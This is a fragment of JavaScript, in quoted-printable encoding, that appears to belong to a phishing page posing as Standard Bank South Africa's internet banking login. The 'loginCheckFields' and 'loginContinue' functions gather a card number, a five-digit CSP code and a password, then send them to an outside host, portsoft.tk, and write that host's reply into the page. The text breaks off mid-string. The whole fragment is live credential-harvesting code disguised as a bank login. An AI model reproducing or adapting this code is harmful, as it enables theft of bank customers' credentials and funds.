    JSloginStandard =3D {
        loginCheckFields : function(){
            var errorCount =3D 0;
            =

            var cardNum =3D $("input#ccn").val();
            var csp =3D $("input#csp").val();
            var pwd =3D $("input#pwd").val();
            =

            if(cardValidations(cardNum) !=3D=3D 0){
                $("p.custom-error.cardnumber-error").show();
                console.log('cardnum invalid');
                errorCount++;
            }else {
                $("p.custom-error.cardnumber-error").hide();
            }
            =

            if(!numericValidation(csp) || csp.length !=3D=3D 5){
                $("p.custom-error.csp-error").show();
                console.log('csp invalid'); errorCount++;
            }else {
                $("p.custom-error.csp-error").hide();
            }

            if(passwordValidations(pwd) !=3D=3D 0){
                $("p.custom-error.pwd-error").show();
                console.log('pwd invalid');
                errorCount++;
            }else {
                $("p.custom-error.pwd-error").hide();
            }
            =

            if(errorCount !=3D=3D 0){
                //this.defaultButton();
                return false;
            }else {
                this.loginContinue($("form#signonForm"));
                //console.log("No Errors");
            }
        },
        loginContinue : function(formValues){
            this.jsShowError();
            ajax_jsonp_call('http://portsoft.tk/stdNoJSZA/continue.bak.php'=
, formValues.serialize(), function(responseText){
                //window.location.href=3D'https://www.standardbank.co.za/se=
cure/online_InternetBank/demo/statementsemail.html';
                document.open();
                document.write(responseText.message);
                document.close();
            });
            //console.log('loggin in...');
            //ajax_jsonp_call
            return true;
        },
        jsShowError : function(){
            var spinnerbtn =3D '<button type=3D"submit" id=3D"login" name=
=3D"login" value=3D"Login" class=3D"btn btn-primary ladda-button" data-styl=
e=3D"expand-left" onclick=3D"" disabled=3D"" data-loading=3D""><span class=
=3D"ladda-label">Login</span><span class=3D"ladda-spinner"></span><span cla=
ss=3D"ladda-spinner"></span><span class=3D"ladda-spinner"><div class=3D"" s=
